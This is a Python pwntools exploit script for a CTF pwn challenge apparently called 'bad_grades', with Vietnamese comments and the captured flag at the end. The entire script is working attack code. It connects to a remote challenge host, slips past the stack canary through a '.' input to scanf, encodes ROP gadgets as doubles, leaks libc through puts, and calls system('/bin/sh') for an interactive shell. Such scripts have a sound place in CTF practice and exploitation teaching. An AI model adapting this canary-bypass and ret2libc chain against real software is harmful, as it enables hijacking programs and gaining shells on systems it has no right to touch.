```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./bad_grades_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe



# p = process([exe.path])
p = remote('206.189.28.180', 30163) 
# gdb.attach(p, gdbscript = '''
# b*0x401107
# c
# ''')

# input()

pop_rdi = 0x0000000000401263
ret = pop_rdi + 1
p.sendlineafter(b'> ', b'2')

p.sendline(b'39')

for i in range(0, 33):
    p.sendline(b'0')

p.sendline(b'.') # bypass canary
p.sendline(b'0') # rbp

# vì nhập vào bằng %lf nên ta phải ép kiểu về double, nếu nhập p64 như bình thường thì sẽ sai
# về cách ép kiểu &lf thì mình có giải thích trong 1 chall ở dưới
# https://github.com/gookoosss/CTF/blob/main/PWN/DownUnderCTF%202023/confusing.md

payload = str(struct.unpack('d', p64(pop_rdi))[0]).encode()
p.sendline(payload)

payload = str(struct.unpack('d', p64(exe.got.puts))[0]).encode()
p.sendline(payload)

payload = str(struct.unpack('d', p64(exe.plt.puts))[0]).encode()
p.sendline(payload)

payload = str(struct.unpack('d', p64(0x400fd5))[0]).encode()
p.sendline(payload)

p.recvuntil(b'\n')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak- libc.sym.puts
print(hex(libc_leak))
print(hex(libc.address))

p.sendline(b'39')

for i in range(0, 33):
    p.sendline(b'0')

p.sendline(b'.')
p.sendline(b'0')

payload = str(struct.unpack('d', p64(pop_rdi))[0]).encode()
p.sendline(payload)

payload = str(struct.unpack('d', p64(next(libc.search(b'/bin/sh\0'))))[0]).encode()
p.sendline(payload)

payload = str(struct.unpack('d', p64(ret))[0]).encode()
p.sendline(payload)

payload = str(struct.unpack('d', p64(libc.sym.system))[0]).encode()
p.sendline(payload)


p.interactive()

# HTB{c4n4ry_1s_4fr41d_0f_s1gn3d_numb3r5}
```
